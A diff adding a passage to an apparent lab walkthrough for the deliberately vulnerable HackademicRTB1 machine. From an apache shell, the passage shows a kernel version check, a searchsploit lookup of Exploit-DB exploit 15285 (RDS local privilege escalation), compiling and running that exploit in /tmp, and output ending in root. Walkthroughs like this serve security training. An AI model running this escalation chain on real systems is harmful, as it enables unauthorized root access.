@@ -223,6 +223,59 @@ uid=48(apache) gid=489(apache) groups=489(apache)
 sh-4.0$
 ```
 
+now we are on the victim machine, after checking various PE vectors i came to nothing but checking the kernel version 
+
+showed that this version is vulnerable :
+
+```bash
+sh-4.0$ uname -a
+
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+```
+
+just check the searchsploit for any public exploit for this version (you need to check a lot of exploit to find the appropriate one)
+
+i just came to this exploit that worked for me
+
+```bash
+root@kali: searchsploit linux 2.6 -w | grep 1528
+Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation                                                 | https://www.exploit-db.com/exploits/15285
+```
+
+upload it on the victim and compile it :
+
+```bash
+bash-4.0$ cd /tmp
+bash-4.0$ gcc 15285.c 
+bash-4.0$ ./a.out 
+[*] Linux kernel >= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[*] Overwriting security ops...
+[*] Overwriting function pointer...
+[*] Triggering payload...
+[*] Restoring function pointer...
+[*] Got root!
+sh-4.0# id
+uid=0(root) gid=0(root)
+sh-4.0# 
+```
+
+yes, this is how we can root this machine :)
+
+
+
+
+
+
+
+
+
 
 
 
